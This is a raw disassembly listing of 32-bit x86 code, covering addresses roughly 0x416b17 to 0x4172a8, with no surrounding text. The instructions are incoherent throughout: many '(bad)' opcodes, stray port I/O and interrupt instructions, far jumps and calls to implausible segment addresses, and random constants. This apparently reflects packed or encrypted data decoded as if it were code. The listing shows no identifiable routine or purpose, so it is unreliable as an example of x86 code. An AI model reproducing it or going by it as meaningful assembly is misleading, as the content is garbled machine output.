  416b17:	xchg   esp,eax
  416b18:	das    
  416b19:	rol    BYTE PTR [edx],cl
  416b1b:	adc    eax,0xee42008d
  416b20:	loopne 0x416b7f
  416b22:	inc    esi
  416b23:	imul   DWORD PTR [ecx-0x51228d90]
  416b29:	cmp    esi,ebx
  416b2b:	add    eax,0x8ed6154a
  416b30:	mov    ah,0x55
  416b32:	rcl    DWORD PTR [esi-0x542d6bca],cl
  416b38:	push   ebp
  416b39:	jl     0x416bb7
  416b3b:	sbb    bl,BYTE PTR [eax+ebx*2+0x75]
  416b3f:	adc    ch,dh
  416b41:	(bad)  
  416b42:	popa   
  416b43:	jno    0x416b47
  416b45:	(bad)  
  416b46:	or     ah,BYTE PTR [eax-0x47]
  416b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b4a:	in     al,0x97
  416b4c:	sbb    al,0x64
  416b4e:	sub    al,0x3c
  416b50:	sbb    DWORD PTR [ecx],ecx
  416b52:	das    
  416b53:	ins    DWORD PTR es:[edi],dx
  416b54:	xor    ecx,ebp
  416b56:	or     edx,DWORD PTR ds:0xbaccb7ef
  416b5c:	lock sub dl,ch
  416b5f:	sub    esp,ebp
  416b61:	je     0x416ae8
  416b63:	je     0x416af4
  416b65:	inc    edi
  416b66:	pop    esi
  416b67:	xor    DWORD PTR [esi],esi
  416b69:	or     DWORD PTR [eax],edx
  416b6b:	rcl    BYTE PTR [ecx+eiz*2],cl
  416b6e:	addr16 mov ebp,0xf4c7fc27
  416b74:	mov    ch,BYTE PTR [esi-0x56e5ac80]
  416b7a:	fadd   QWORD PTR [esi-0x5e964da8]
  416b80:	adc    ch,ah
  416b82:	loopne 0x416b14
  416b84:	stos   DWORD PTR es:[edi],eax
  416b85:	loope  0x416bc2
  416b87:	mov    cl,0x5d
  416b89:	ficom  WORD PTR [edx+0x3db50472]
  416b8f:	jae    0x416bed
  416b91:	push   esi
  416b92:	dec    ebp
  416b93:	mov    cl,0xb0
  416b95:	sar    DWORD PTR [edi-0x76],1
  416b98:	lods   eax,DWORD PTR ds:[esi]
  416b99:	pop    si
  416b9b:	push   dx
  416b9d:	xchg   ecx,eax
  416b9e:	add    eax,0xae549220
  416ba3:	jg     0x416bd9
  416ba5:	mov    al,0x35
  416ba7:	stos   DWORD PTR es:[edi],eax
  416ba8:	call   0xc3836de1
  416bad:	adc    al,0x28
  416baf:	aad    0x20
  416bb1:	(bad)  [eax+0x72]
  416bb4:	enter  0xcd53,0xb6
  416bb8:	rol    BYTE PTR [esi],cl
  416bba:	outs   dx,DWORD PTR ds:[esi]
  416bbb:	inc    ebp
  416bbc:	adc    edx,DWORD PTR [ecx-0x6a]
  416bbf:	lods   al,BYTE PTR ds:[esi]
  416bc0:	fsubr  QWORD PTR [edi+0x3f]
  416bc3:	sbb    DWORD PTR ds:0x8582d86c,0xffffffe4
  416bca:	in     eax,dx
  416bcb:	pop    ss
  416bcc:	clc    
  416bcd:	popa   
  416bce:	adc    eax,0xa642307b
  416bd3:	sti    
  416bd4:	addr16 mov ch,0xe7
  416bd7:	clc    
  416bd8:	stc    
  416bd9:	pop    ds
  416bda:	xchg   edx,eax
  416bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bdc:	mov    ecx,0x58f5dab6
  416be1:	mov    ebx,0xd4a64d93
  416be6:	inc    ebp
  416be7:	shl    BYTE PTR [esi+0x7f],0xac
  416beb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bec:	dec    esp
  416bed:	popf   
  416bee:	ins    BYTE PTR es:[edi],dx
  416bef:	xlat   BYTE PTR ds:[ebx]
  416bf0:	pop    ecx
  416bf1:	xchg   DWORD PTR [esi+0x613bb25],edi
  416bf7:	lods   al,BYTE PTR ds:[esi]
  416bf8:	test   al,0x1c
  416bfa:	scas   al,BYTE PTR es:[edi]
  416bfb:	lds    eax,FWORD PTR [edx+0x472334ae]
  416c01:	test   eax,0x6640a86a
  416c06:	push   ebx
  416c07:	push   0xffffffda
  416c09:	push   edx
  416c0a:	outs   dx,DWORD PTR fs:[esi]
  416c0c:	outs   dx,DWORD PTR ds:[esi]
  416c0d:	jmp    0xde2e:0x25761738
  416c14:	sub    DWORD PTR [edx+0x29],eax
  416c17:	cmp    BYTE PTR [ebp+eiz*8-0x60],ch
  416c1b:	loope  0x416c77
  416c1d:	dec    ebp
  416c1e:	hlt    
  416c1f:	int    0xe3
  416c21:	mov    dh,0xad
  416c23:	jle    0x416be0
  416c25:	xor    al,0xf1
  416c27:	pop    eax
  416c28:	adc    DWORD PTR fs:[edi+0x16035034],eax
  416c2f:	add    eax,0x1784761b
  416c34:	rol    DWORD PTR ds:0x34df6d5b,0xe8
  416c3b:	div    ch
  416c3d:	mov    ah,0x4e
  416c3f:	mov    ebx,0x49d71e86
  416c44:	or     BYTE PTR [ecx-0x68efcf23],0x46
  416c4b:	out    0x1,eax
  416c4d:	mov    cl,0xb3
  416c4f:	int3   
  416c50:	out    0x5a,al
  416c52:	mov    edx,0xb1454407
  416c57:	add    eax,0x7b2c1d94
  416c5c:	cmc    
  416c5d:	stos   DWORD PTR es:[edi],eax
  416c5e:	rol    BYTE PTR [ebp-0x40],0xb1
  416c62:	pop    edx
  416c63:	xchg   ebp,eax
  416c64:	js     0x416cc2
  416c66:	dec    ebx
  416c67:	cli    
  416c68:	ret    
  416c69:	jo     0x416c53
  416c6b:	jp     0x416c47
  416c6d:	mov    esi,0xd7c022dd
  416c72:	lods   al,BYTE PTR ds:[esi]
  416c73:	mov    edx,0x500da881
  416c78:	fiadd  DWORD PTR [ebx]
  416c7a:	icebp  
  416c7b:	retf   0xebc
  416c7e:	js     0x416c33
  416c80:	mov    BYTE PTR [eax-0x2820992b],0xe5
  416c87:	jp     0x416cf7
  416c89:	out    dx,al
  416c8a:	push   ebp
  416c8b:	push   esp
  416c8c:	retf   0x5e34
  416c8f:	sub    al,0x48
  416c91:	and    ecx,DWORD PTR [ecx+edx*2+0x2c]
  416c95:	pop    ds
  416c96:	sub    BYTE PTR [ebx],al
  416c98:	int    0x32
  416c9a:	jae    0x416c7b
  416c9c:	dec    ebx
  416c9d:	mov    ch,0x53
  416c9f:	loop   0x416c68
  416ca1:	pop    esi
  416ca2:	cmp    DWORD PTR [ebp-0xd0aa017],esp
  416ca8:	jmp    0x416c72
  416caa:	iret   
  416cab:	jle    0x416d1d
  416cad:	lock xlat BYTE PTR ds:[ebx]
  416caf:	fstp   DWORD PTR [edi-0x11afbc46]
  416cb5:	sub    eax,DWORD PTR [edi-0x381cd9d]
  416cbb:	mov    bl,0x13
  416cbd:	cmp    ebx,DWORD PTR [ebx]
  416cbf:	pop    esp
  416cc0:	push   edx
  416cc1:	arpl   WORD PTR [esi+0x49],di
  416cc4:	mov    dh,0xf
  416cc6:	and    dh,dh
  416cc8:	les    edx,FWORD PTR [eax+0x5]
  416ccb:	jecxz  0x416c6f
  416ccd:	int3   
  416cce:	loope  0x416caf
  416cd0:	(bad)  
  416cd1:	imul   edi,DWORD PTR [edi+0x56546b2f],0x65b4dc2f
  416cdb:	cmp    edx,esp
  416cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cde:	ins    DWORD PTR es:[edi],dx
  416cdf:	jns    0x416ce2
  416ce1:	mov    esi,0x3b65cc8c
  416ce6:	sub    ebx,DWORD PTR [ebp+0x3a771c4c]
  416cec:	pop    eax
  416ced:	shl    DWORD PTR [esi],0xd1
  416cf0:	fcmove st,st(5)
  416cf2:	ss jns 0x416cea
  416cf5:	clc    
  416cf6:	ds xor ebp,edx
  416cf9:	push   cs
  416cfa:	mov    dh,al
  416cfc:	(bad)  
  416cfd:	sub    al,0xdf
  416cff:	shr    dl,0xf8
  416d02:	ret    0x6c72
  416d05:	jle    0x416cee
  416d07:	adc    DWORD PTR [edx-0x2],esp
  416d0a:	pcmpeqd mm5,QWORD PTR [ebx+0x362e555d]
  416d11:	or     bh,BYTE PTR [edx+ecx*4+0x7307dcc]
  416d18:	in     al,dx
  416d19:	sbb    DWORD PTR ds:0xfc654f0f,0xffffffc4
  416d20:	inc    edi
  416d21:	adc    DWORD PTR [edx+0x3f71a5d7],ebp
  416d27:	inc    edi
  416d28:	ins    BYTE PTR es:[edi],dx
  416d29:	dec    edx
  416d2a:	xchg   BYTE PTR [ecx-0x4c23e0dd],ah
  416d30:	pushf  
  416d31:	ror    cl,cl
  416d33:	inc    BYTE PTR [ebx+0x46db4126]
  416d39:	mov    dh,BYTE PTR [esp+edx*1+0x15]
  416d3d:	cwde   
  416d3e:	push   esi
  416d3f:	push   ss
  416d40:	ret    
  416d41:	mov    bh,0x9e
  416d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d44:	and    eax,0x1ee83193
  416d49:	(bad)  
  416d4a:	cmp    eax,0x4b7dde70
  416d4f:	jle    0x416d56
  416d51:	std    
  416d52:	test   DWORD PTR [ebx],ebx
  416d54:	gs or  al,0x77
  416d57:	fld    QWORD PTR [edx+eax*1+0x1a931adb]
  416d5e:	not    BYTE PTR [ebp+0x9]
  416d61:	push   0x7c89a04
  416d66:	ss jmp 0x416dbb
  416d69:	test   al,0x11
  416d6b:	aad    0x9c
  416d6d:	mov    dh,BYTE PTR [ecx-0x2d]
  416d70:	dec    esi
  416d71:	js     0x416d98
  416d73:	not    al
  416d75:	in     eax,0x0
  416d77:	test   eax,0xac89a461
  416d7c:	cwde   
  416d7d:	shl    BYTE PTR [edx],1
  416d7f:	popf   
  416d80:	clc    
  416d81:	jp     0x416d56
  416d83:	mov    esp,0xd87d4f10
  416d88:	mul    BYTE PTR [edx+0x25]
  416d8b:	lea    esp,[eax-0x6c]
  416d8e:	test   al,0xd
  416d90:	xchg   DWORD PTR [esp+esi*2],edi
  416d93:	xor    dl,BYTE PTR [eax+edi*1]
  416d96:	jmp    0x416d70
  416d98:	repnz dec ecx
  416d9a:	xchg   esi,eax
  416d9b:	pop    esi
  416d9c:	or     DWORD PTR [ebx],ebx
  416d9e:	daa    
  416d9f:	push   0x57
  416da1:	cmp    BYTE PTR [edx],0x59
  416da4:	imul   edx,edx,0x1009064d
  416daa:	mov    edi,0xc2b8a777
  416daf:	mov    ch,0x8b
  416db1:	enter  0xea33,0xdb
  416db5:	stos   DWORD PTR es:[edi],eax
  416db6:	popa   
  416db7:	jle    0x416e08
  416db9:	pop    ebx
  416dba:	fwait
  416dbb:	mov    ch,0xea
  416dbd:	cmp    eax,0x30c50a3c
  416dc2:	cmp    DWORD PTR [eax-0x2b],edi
  416dc5:	mov    edi,0x49b7e606
  416dca:	pop    eax
  416dcb:	push   es
  416dcc:	push   ss
  416dcd:	jl     0x416db7
  416dcf:	gs out dx,eax
  416dd1:	sub    bh,BYTE PTR [ebp-0x47]
  416dd4:	push   es
  416dd5:	js     0x416d61
  416dd7:	test   al,0x36
  416dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dda:	xchg   ebx,eax
  416ddb:	dec    ecx
  416ddc:	xchg   ecx,eax
  416ddd:	jle    0x416d64
  416ddf:	jmp    0x416e5a
  416de1:	mov    eax,ds:0x332cdcda
  416de6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416de7:	and    BYTE PTR [esi-0x4c],0xae
  416deb:	pushf  
  416dec:	jg     0x416dc0
  416dee:	inc    esp
  416def:	or     bh,BYTE PTR [esi]
  416df1:	adc    al,0xd6
  416df3:	xchg   edi,eax
  416df4:	xchg   edx,eax
  416df5:	cmp    BYTE PTR [edx+0x10],cl
  416df8:	call   0x5a91:0xab4091f9
  416dff:	aas    
  416e00:	jg     0x416dd8
  416e02:	imul   esi,DWORD PTR [eax+ebp*8+0x6f],0xaa8420d1
  416e0a:	jmp    0x9d31:0xad66fdc4
  416e11:	push   ss
  416e12:	aaa    
  416e13:	in     al,0xb2
  416e15:	mov    ch,0xea
  416e17:	pop    ss
  416e18:	pusha  
  416e19:	pop    ss
  416e1a:	dec    edx
  416e1b:	adc    DWORD PTR [ebx-0x78],ebx
  416e1e:	lods   al,BYTE PTR ds:[esi]
  416e1f:	jge    0x416df6
  416e21:	(bad)  
  416e22:	ins    DWORD PTR es:[edi],dx
  416e23:	mov    edx,0xb33b54eb
  416e28:	je     0x416dae
  416e2a:	jnp    0x416dce
  416e2c:	inc    eax
  416e2d:	cli    
  416e2e:	fwait
  416e2f:	outs   dx,DWORD PTR ds:[esi]
  416e30:	push   ds
  416e31:	out    0xb6,eax
  416e33:	inc    edx
  416e34:	push   0xcde31797
  416e39:	or     al,0x37
  416e3b:	cmp    eax,0xbff063df
  416e40:	sub    al,0x87
  416e42:	enter  0x2bcd,0xcf
  416e46:	mov    al,ds:0xfe6b9eb8
  416e4b:	mov    edx,0xc4e381b4
  416e50:	ins    DWORD PTR es:[edi],dx
  416e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e52:	jno    0x416e65
  416e54:	xor    DWORD PTR [esi],ebx
  416e56:	xor    BYTE PTR [eax],bl
  416e58:	jb     0x416e5e
  416e5a:	loope  0x416eb0
  416e5c:	sbb    DWORD PTR [esi+0x42],edi
  416e5f:	cli    
  416e60:	sti    
  416e61:	jno    0x416e87
  416e63:	repnz mov ecx,0xa4379e4f
  416e69:	inc    esp
  416e6a:	push   0xffffffd9
  416e6c:	aas    
  416e6d:	adc    dl,BYTE PTR [edi+0x21584a2e]
  416e73:	outs   dx,BYTE PTR ds:[esi]
  416e74:	xchg   edx,eax
  416e75:	(bad)  [edi+esi*8+0x7ebcd55b]
  416e7c:	xor    dh,ah
  416e7e:	sti    
  416e7f:	mov    bl,BYTE PTR [edi-0x44bcc26]
  416e85:	les    ebx,FWORD PTR [ebx+0x2660fa3]
  416e8b:	jp     0x416f01
  416e8d:	rcl    DWORD PTR [esi+0x1ce12ab5],cl
  416e93:	push   edx
  416e94:	or     al,0xd3
  416e96:	add    al,cl
  416e98:	adc    BYTE PTR [esi-0x3c],ch
  416e9b:	adc    eax,DWORD PTR [edi]
  416e9d:	in     eax,0x1b
  416e9f:	scas   eax,DWORD PTR es:[edi]
  416ea0:	das    
  416ea1:	fs sti 
  416ea3:	mov    edi,0xcf54463a
  416ea9:	xchg   ebx,eax
  416eaa:	scas   al,BYTE PTR es:[edi]
  416eab:	scas   eax,DWORD PTR es:[edi]
  416eac:	lds    ebp,FWORD PTR [eax+ecx*2]
  416eaf:	in     eax,dx
  416eb0:	or     eax,0xf29d432a
  416eb5:	push   edx
  416eb6:	jns    0x416e96
  416eb8:	scas   al,BYTE PTR es:[edi]
  416eb9:	push   ebx
  416eba:	jecxz  0x416e6c
  416ebc:	dec    esi
  416ebd:	and    eax,DWORD PTR [edi+0x5]
  416ec0:	adc    DWORD PTR [ebp-0x5d],esi
  416ec3:	mov    fs,edi
  416ec5:	popf   
  416ec6:	pop    ecx
  416ec7:	push   esp
  416ec8:	cmp    BYTE PTR [ebp+ebp*1+0x60706dc7],ch
  416ecf:	popf   
  416ed0:	(bad)  
  416ed1:	das    
  416ed2:	popf   
  416ed3:	or     dl,0xb7
  416ed6:	call   0xf141:0x6b062fb3
  416edd:	xor    ebp,0x13
  416ee0:	je     0x416ebb
  416ee2:	je     0x416f24
  416ee4:	mov    al,ds:0x28ef9d56
  416ee9:	mov    al,0x56
  416eeb:	or     al,0x5c
  416eed:	jno    0x416ec0
  416eef:	and    eax,ebx
  416ef1:	fs dec esp
  416ef3:	mov    bl,0x76
  416ef5:	popa   
  416ef6:	rol    BYTE PTR [esi],1
  416ef8:	mov    ds:0x969606cb,eax
  416efd:	call   FWORD PTR [ebx]
  416eff:	push   0xffffffbb
  416f01:	repnz inc edi
  416f03:	xor    BYTE PTR [ebp+eax*4+0x37],bl
  416f07:	sbb    eax,0x3436b650
  416f0c:	sti    
  416f0d:	mov    ds:0x1d6fdf31,al
  416f12:	pop    ebp
  416f13:	push   ebp
  416f14:	or     edi,DWORD PTR [ecx+ecx*1-0x5ca41b7c]
  416f1b:	int    0x3f
  416f1d:	or     dh,BYTE PTR [eax]
  416f1f:	adc    al,BYTE PTR [eax-0x78]
  416f22:	jmp    0xc0bb2674
  416f27:	mov    al,ds:0x767c4419
  416f2c:	loop   0x416f16
  416f2e:	std    
  416f2f:	pop    eax
  416f30:	outs   dx,DWORD PTR ds:[esi]
  416f31:	inc    edx
  416f32:	and    esi,DWORD PTR [edi+ebx*2-0x18]
  416f36:	or     BYTE PTR [ebx-0x1cecfa56],al
  416f3c:	arpl   dx,si
  416f3e:	mov    esp,0xd2cb4756
  416f43:	fmul   st,st(5)
  416f45:	fwait
  416f46:	or     BYTE PTR [ecx+0x74],cl
  416f49:	pop    ecx
  416f4a:	outs   dx,DWORD PTR ds:[esi]
  416f4b:	fldcw  WORD PTR [ebx]
  416f4d:	imul   ecx,ebx,0x22
  416f50:	push   ebx
  416f51:	xchg   DWORD PTR [ebx+0x46],edi
  416f54:	aam    0x83
  416f56:	int3   
  416f57:	mov    ecx,0x1647dd85
  416f5c:	xchg   esi,eax
  416f5d:	ret    0x19f9
  416f60:	sti    
  416f61:	fwait
  416f62:	test   eax,0xfa92846e
  416f67:	aaa    
  416f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f69:	jae    0x416f1b
  416f6b:	and    eax,0x3b122a68
  416f70:	adc    ebp,DWORD PTR [edi+ecx*2+0x54d222a9]
  416f77:	int3   
  416f78:	jecxz  0x416f2e
  416f7a:	xor    eax,DWORD PTR [edx-0xcc4daa2]
  416f80:	jmp    0x839ae46f
  416f85:	test   al,0x64
  416f87:	pop    ecx
  416f88:	xor    ecx,DWORD PTR [eax+0x47]
  416f8b:	sbb    ebx,edi
  416f8d:	dec    esi
  416f8e:	dec    ecx
  416f8f:	inc    ecx
  416f90:	pop    ebp
  416f91:	(bad)  
  416f92:	push   0x1a497628
  416f97:	out    dx,eax
  416f98:	jg     0x416fb5
  416f9a:	jne    0x416fa7
  416f9c:	test   eax,0x73a584e9
  416fa1:	call   0x3db597f0
  416fa6:	jne    0x417006
  416fa8:	mov    ?,ebx
  416faa:	in     al,0x84
  416fac:	mov    edi,DWORD PTR [edi+edi*2-0x1f]
  416fb0:	and    al,0x63
  416fb2:	lea    esp,[edi-0x59]
  416fb5:	mov    ds:0x831d286b,al
  416fba:	std    
  416fbb:	push   ebx
  416fbc:	sbb    ebx,DWORD PTR [ebx]
  416fbe:	mov    al,0x58
  416fc0:	push   0x4a
  416fc2:	adc    eax,0xe1fa8d62
  416fc7:	inc    eax
  416fc8:	je     0x416f8b
  416fca:	pop    ss
  416fcb:	and    ah,dh
  416fcd:	pushf  
  416fce:	mov    cs,WORD PTR [esi+0x7b0c2d12]
  416fd4:	jo     0x41703f
  416fd6:	pop    esi
  416fd7:	stos   BYTE PTR es:[edi],al
  416fd8:	hlt    
  416fd9:	test   al,0x8d
  416fdb:	mov    ds:0xcb993eeb,eax
  416fe0:	or     ah,BYTE PTR [ebx-0x2d]
  416fe3:	and    dh,bh
  416fe5:	adc    dl,dh
  416fe7:	test   al,0x4a
  416fe9:	sub    DWORD PTR [ebp+esi*4+0x5f],edx
  416fed:	outs   dx,DWORD PTR ds:[esi]
  416fee:	cmp    BYTE PTR [edi-0x55],dl
  416ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ff2:	cmp    cl,bh
  416ff4:	cmc    
  416ff5:	sub    eax,0x83523ff9
  416ffa:	jecxz  0x41701e
  416ffc:	pop    ds
  416ffd:	add    eax,0x46f862c0
  417002:	aad    0xd9
  417004:	shr    DWORD PTR [ebx],1
  417006:	push   edi
  417007:	add    dl,BYTE PTR [eax-0x41dff459]
  41700d:	arpl   WORD PTR [edi],bp
  41700f:	bound  ebx,QWORD PTR [edx]
  417011:	in     eax,dx
  417012:	out    0x2e,al
  417014:	push   ebp
  417015:	mov    edi,esi
  417017:	and    BYTE PTR [ebx+0x6c],cl
  41701a:	mov    ah,0x4d
  41701c:	in     al,0x82
  41701e:	mov    ch,0x59
  417020:	jg     0x417074
  417022:	inc    esi
  417023:	mov    ah,0x1c
  417025:	pusha  
  417026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417027:	loopne 0x417074
  417029:	popa   
  41702a:	jb     0x416fb5
  41702c:	jp     0x417025
  41702e:	mov    cl,0xb3
  417030:	and    al,0x7c
  417032:	or     eax,0xf5b8743b
  417037:	test   DWORD PTR [esi-0x6501cd98],esi
  41703d:	(bad)  
  41703e:	mov    eax,0xf4acbee9
  417043:	(bad)  
  417044:	cmp    DWORD PTR [edx-0x15],ebp
  417047:	(bad)  
  417048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417049:	out    0xd2,al
  41704b:	xchg   ecx,eax
  41704c:	stos   BYTE PTR es:[edi],al
  41704d:	push   edi
  41704e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41704f:	fneni(8087 only) 
  417051:	inc    edx
  417052:	pusha  
  417053:	ds xchg esp,eax
  417055:	jb     0x41700c
  417057:	push   0x707b9950
  41705c:	test   edi,edx
  41705e:	xchg   ecx,eax
  41705f:	iret   
  417060:	lods   al,BYTE PTR ds:[esi]
  417061:	pop    ecx
  417062:	pop    ds
  417063:	or     DWORD PTR [esi-0x5d7f1bb2],eax
  417069:	mov    ds,edx
  41706b:	adc    DWORD PTR [eax-0x62],0x1ff0e083
  417072:	mul    BYTE PTR ss:[bp-0x27]
  417077:	and    al,0x1
  417079:	sbb    eax,0xf3aa85cf
  41707e:	arpl   WORD PTR [eax+eax*8],si
  417081:	or     ah,0x20
  417084:	mov    ch,0x43
  417086:	cwde   
  417087:	cdq    
  417088:	xlat   BYTE PTR ds:[ebx]
  417089:	into   
  41708a:	int    0x1
  41708c:	dec    ebx
  41708d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41708e:	es (bad) 
  417090:	loop   0x4170e9
  417092:	rcl    BYTE PTR [esi],0x6b
  417095:	retf   0x3b86
  417098:	inc    eax
  417099:	adc    eax,0x2c84cf8d
  41709e:	icebp  
  41709f:	pop    eax
  4170a0:	pusha  
  4170a1:	bound  eax,QWORD PTR [ebx+0x158b8433]
  4170a7:	repz jg 0x4170c6
  4170aa:	dec    edi
  4170ab:	dec    ebp
  4170ac:	xchg   ecx,eax
  4170ad:	inc    esi
  4170ae:	xchg   ebp,eax
  4170af:	push   esi
  4170b0:	fst    QWORD PTR [esi+edx*8-0x3e53fad2]
  4170b7:	in     al,0xe5
  4170b9:	xchg   esi,eax
  4170ba:	ror    cl,cl
  4170bc:	je     0x417097
  4170be:	jo     0x41709e
  4170c0:	les    ebp,FWORD PTR [edx+0x12]
  4170c3:	or     al,0x17
  4170c5:	(bad)  
  4170c6:	retf   0xeabe
  4170c9:	retf   
  4170ca:	fcmovb st,st(0)
  4170cc:	std    
  4170cd:	call   0x8821080a
  4170d2:	dec    edx
  4170d3:	and    edi,edx
  4170d5:	jle    0x4170fc
  4170d7:	xor    DWORD PTR [ecx],esi
  4170d9:	inc    esi
  4170da:	lods   al,BYTE PTR ds:[esi]
  4170db:	mov    esp,0xa99874d7
  4170e0:	xchg   edi,eax
  4170e1:	imul   eax,DWORD PTR [ebp-0x267a1475],0xffffffd4
  4170e8:	jp     0x41712e
  4170ea:	sbb    DWORD PTR [edi-0x66],edx
  4170ed:	xchg   ebp,eax
  4170ee:	imul   edi,esi,0x71ab7034
  4170f4:	stc    
  4170f5:	pop    ecx
  4170f6:	(bad)  
  4170f7:	cs jecxz 0x417177
  4170fa:	mov    dh,0xfa
  4170fc:	aad    0xff
  4170fe:	cmp    DWORD PTR [ebp+0x3e353b24],ebx
  417104:	jle    0x417120
  417106:	sub    BYTE PTR [ebx-0x1],bl
  417109:	sbb    BYTE PTR [edx],0xd8
  41710c:	pop    ebx
  41710d:	jnp    0x4170e9
  41710f:	jge    0x4170d0
  417111:	or     ebx,eax
  417113:	mov    al,ds:0x4e862d8e
  417118:	xor    ecx,DWORD PTR [edx+0x68]
  41711b:	imul   eax,DWORD PTR [edx],0x8
  41711e:	jg     0x417138
  417120:	scas   eax,DWORD PTR es:[edi]
  417121:	pushf  
  417122:	inc    ebp
  417123:	(bad)  
  417124:	fstp   st(6)
  417126:	sbb    BYTE PTR [edx],cl
  417128:	adc    dl,BYTE PTR [ebx]
  41712a:	jnp    0x4170ef
  41712c:	and    edx,DWORD PTR [ebp-0x9e7aa16]
  417132:	call   0xd772991a
  417137:	push   0xb84fb29a
  41713c:	cld    
  41713d:	cld    
  41713e:	mov    ?,WORD PTR [eax+0x11f10347]
  417144:	jns    0x417138
  417146:	sti    
  417147:	fsub   QWORD PTR [eax+0x3e13e58a]
  41714d:	fcomp  QWORD PTR [edx-0x76ddf558]
  417153:	push   esp
  417154:	dec    esi
  417155:	pop    edx
  417156:	sbb    edx,DWORD PTR [edi]
  417158:	iret   
  417159:	imul   edx,DWORD PTR [ebp-0x2b7ae505],0xf197cc4c
  417163:	jbe    0x417109
  417165:	cld    
  417166:	jnp    0x417145
  417168:	sahf   
  417169:	dec    esi
  41716a:	pusha  
  41716b:	ror    BYTE PTR [ebp-0x12],0xa8
  41716f:	xor    BYTE PTR [ecx-0x4454967e],cl
  417175:	sub    esp,DWORD PTR [esp+eax*2-0x63f0a4f4]
  41717c:	push   ds
  41717d:	ret    
  41717e:	mov    eax,ds:0x488b4edb
  417183:	mov    ?,WORD PTR [eax+edx*4-0x58]
  417187:	dec    edi
  417188:	sub    BYTE PTR [ebp+0x71],0x90
  41718c:	cs in  eax,dx
  41718e:	inc    ebx
  41718f:	xchg   bh,bh
  417191:	retf   0x263b
  417194:	adc    DWORD PTR [ebp-0x4d9443d1],ecx
  41719a:	adc    edi,DWORD PTR [ecx-0x39]
  41719d:	scas   al,BYTE PTR es:[edi]
  41719e:	(bad)  
  41719f:	sahf   
  4171a0:	mov    ch,0x2f
  4171a2:	and    cl,ah
  4171a4:	lea    ebx,gs:[eax+0x26]
  4171a8:	inc    eax
  4171a9:	mov    BYTE PTR [eax+0x2a],bl
  4171ac:	test   DWORD PTR [ebp-0x17],ecx
  4171af:	mov    al,0xaf
  4171b1:	xchg   edx,eax
  4171b2:	mov    esp,DWORD PTR [eax+eax*8]
  4171b5:	(bad)  
  4171b6:	cmp    ch,BYTE PTR [edi-0x6fc47863]
  4171bc:	push   es
  4171bd:	sahf   
  4171be:	push   ss
  4171bf:	test   DWORD PTR [edi],0xbc7e6e9c
  4171c5:	fist   DWORD PTR [edx]
  4171c7:	adc    BYTE PTR [ecx+0x4b6cd826],0x6d
  4171ce:	dec    ebx
  4171cf:	push   cs
  4171d0:	dec    ebx
  4171d1:	scas   eax,DWORD PTR es:[edi]
  4171d2:	inc    esi
  4171d3:	mov    ch,0x24
  4171d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171d6:	adc    bh,BYTE PTR [eax]
  4171d8:	lods   eax,DWORD PTR ds:[esi]
  4171d9:	and    cl,BYTE PTR [edi+0x62]
  4171dc:	stos   BYTE PTR es:[edi],al
  4171dd:	ror    DWORD PTR [edx-0x57],cl
  4171e0:	and    edx,DWORD PTR [edi+0x26265ed6]
  4171e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171e7:	jbe    0x41721a
  4171e9:	loope  0x41722d
  4171eb:	jmp    0x4171bb
  4171ed:	inc    esp
  4171ee:	fwait
  4171ef:	sbb    bh,cl
  4171f1:	push   0x1e5e09b1
  4171f6:	retf   0xe8e9
  4171f9:	inc    esp
  4171fa:	je     0x41718e
  4171fc:	sar    BYTE PTR [eax-0x6655b0e5],1
  417202:	cmp    ch,bl
  417204:	je     0x417267
  417206:	fsubp  st(7),st
  417208:	mov    DWORD PTR [esi+esi*2+0x69],0x6facb3de
  417210:	mov    edi,0xb53d1364
  417215:	sbb    DWORD PTR [eax],esi
  417217:	fdivr  DWORD PTR [esi-0x6933f75]
  41721d:	fcomp  QWORD PTR [ecx+0x666fb1ae]
  417223:	leave  
  417224:	sbb    al,0x84
  417226:	test   DWORD PTR [esi],ebp
  417228:	icebp  
  417229:	sub    al,0xe
  41722b:	jmp    0x4836c022
  417230:	mov    BYTE PTR [ecx+0x25],dh
  417233:	lea    edi,[esi-0x40]
  417236:	and    al,0xd9
  417238:	push   ds
  417239:	repz dec edi
  41723b:	mov    ch,0x2b
  41723d:	repz or ebp,DWORD PTR [edx-0x74]
  417241:	sar    BYTE PTR [ebx+edx*1],cl
  417244:	inc    edx
  417246:	mov    ah,0x1f
  417248:	xor    DWORD PTR [ebx-0x6c76b960],ecx
  41724e:	dec    eax
  41724f:	cmp    BYTE PTR [ecx-0x6ca9e7ee],bl
  417255:	popa   
  417256:	inc    eax
  417257:	push   0x1f6c3e11
  41725c:	mov    ss:0x2b3eb211,eax
  417262:	shl    DWORD PTR [edx-0x165273b9],1
  417268:	jmp    0x5cfcfa91
  41726d:	cdq    
  41726e:	lahf   
  41726f:	das    
  417270:	adc    eax,0x3b6e2561
  417275:	sub    BYTE PTR [edi+0x32d74799],cl
  41727b:	push   edx
  41727c:	sub    ecx,DWORD PTR [eax-0x16]
  41727f:	jge    0x4172eb
  417281:	loop   0x4172cb
  417283:	enter  0x9afe,0xd2
  417287:	push   ebx
  417288:	lea    ebp,[ecx-0x80]
  41728b:	in     al,0x62
  41728d:	jo     0x417305
  41728f:	sub    DWORD PTR [esi-0x53],0xabb8ed73
  417296:	mov    al,0xbe
  417298:	repz shl BYTE PTR [edi],cl
  41729b:	pop    esi
  41729c:	retf   0x2156
  41729f:	(bad)  
  4172a0:	xchg   ecx,eax
  4172a1:	dec    ebp
  4172a2:	leave  
  4172a3:	daa    
  4172a4:	cmp    eax,esp
  4172a6:	loope  0x4172b1
  4172a8:	dec    ebp
